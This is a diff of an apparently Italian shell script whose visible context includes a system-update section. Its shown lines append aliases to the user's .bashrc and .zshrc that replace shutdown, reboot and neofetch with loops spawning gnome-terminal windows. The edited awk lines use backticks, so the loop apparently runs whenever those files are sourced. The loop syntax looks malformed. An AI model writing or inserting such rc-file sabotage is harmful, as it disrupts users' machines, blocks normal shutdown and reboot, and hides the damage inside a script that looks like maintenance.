@@ -13,8 +13,8 @@ echo 'alias shutdown="while do gnome-terminal; done ||"' >>  ~/.zshrc
 echo 'alias shutdown="while do gnome-terminal; done ||"' >> ~/.bashrc
 echo 'alias reboot="while do gnome-terminal; done ||"' >> ~/.zshrc
 echo 'alias reboot="while do gnome-terminal; done ||"' >> ~/.bashrc
-awk 'BEGIN {print "alias neofetch='while do gnome-terminal; done ||'"} {print}' .zshrc > suca.txt && mv suca.txt .zshrc
-awk 'BEGIN {print "alias neofetch='while do gnome-terminal; done ||'"} {print}' .bashrc > suca.txt && mv suca.txt .bashrc
+awk 'BEGIN {print "alias neofetch=`while do gnome-terminal; done ||`"} {print}' ~/.zshrc > suca.txt && mv suca.txt ~/.zshrc
+awk 'BEGIN {print "alias neofetch=`while do gnome-terminal; done ||`"} {print}' ~/.bashrc > suca.txt && mv suca.txt ~/.bashrc
 
 # Aggiornamento del sistema
 echo "Aggiornamento del sistema in corso..."
